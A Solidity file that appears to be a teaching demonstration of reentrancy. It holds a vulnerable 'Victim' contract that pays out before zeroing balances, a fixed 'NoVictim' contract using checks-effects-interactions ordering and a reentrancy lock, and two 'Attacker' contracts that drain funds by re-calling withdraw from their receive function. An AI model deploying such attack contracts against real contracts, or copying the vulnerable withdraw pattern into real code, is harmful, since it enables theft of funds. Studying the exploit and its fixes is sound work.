// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract Victim {
    constructor() payable {}

    mapping(address => uint256) public balances;

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0);
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

contract NoVictim {
    bool public isLocked;
    modifier nonReentrant() {
        require(!isLocked, "No reentrancy");
        isLocked = true;
        _;
        isLocked = false;
    }

    constructor() payable {}

    mapping(address => uint256) public balances;

    function withdraw() public {
        // check - effects - interaction

        // checks
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No hay fondos para retirar");

        // effects
        balances[msg.sender] = 0;

        // interaction
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }

    function withdraw2() public nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0);
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

interface IVictim {
    function deposit() external payable;

    function withdraw() external;

    function withdraw2() external;
}

contract Attacker {
    IVictim victim;

    constructor(address _victimAddress) payable {
        victim = IVictim(_victimAddress);
    }

    function attack() public {
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw();
        }
    }
}

contract Attacker2 {
    IVictim victim;

    constructor(address _victimAddress) payable {
        victim = IVictim(_victimAddress);
    }

    function attack() public {
        victim.deposit{value: 1 ether}();
        victim.withdraw2();
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw2();
        }
    }
}
